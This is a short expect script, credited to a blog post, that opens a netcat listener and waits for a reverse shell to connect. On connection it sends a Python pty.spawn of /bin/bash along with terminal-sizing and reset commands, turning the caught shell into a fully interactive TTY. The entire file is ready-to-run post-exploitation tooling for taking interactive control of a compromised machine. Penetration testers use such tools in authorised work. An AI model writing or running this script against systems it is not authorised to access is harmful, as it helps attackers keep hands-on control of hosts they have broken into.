#!/usr/bin/expect
#script found on:
#https://blog.polverari.com.br/en/posts/full-auto-interactive-tty/
set timeout -1

set rows [exec bash -c {stty -a | head -1 | grep -oP '(?<=rows )\w+(?=;)'}]
set cols [exec bash -c {stty -a | head -1 | grep -oP '(?<=columns )\w+(?=;)'}]
set term [exec bash -c {printenv TERM}]
set stty_init {raw -echo}

spawn nc -nlvp [lindex $argv 0]
expect {
	"Connection from" {
		send "python -c 'import pty;pty.spawn(\"/bin/bash\");'\r"
		send "stty rows ${rows} columns ${cols}\r"
		send "export TERM=xterm\r"
		send "reset\r"
	}
}
interact
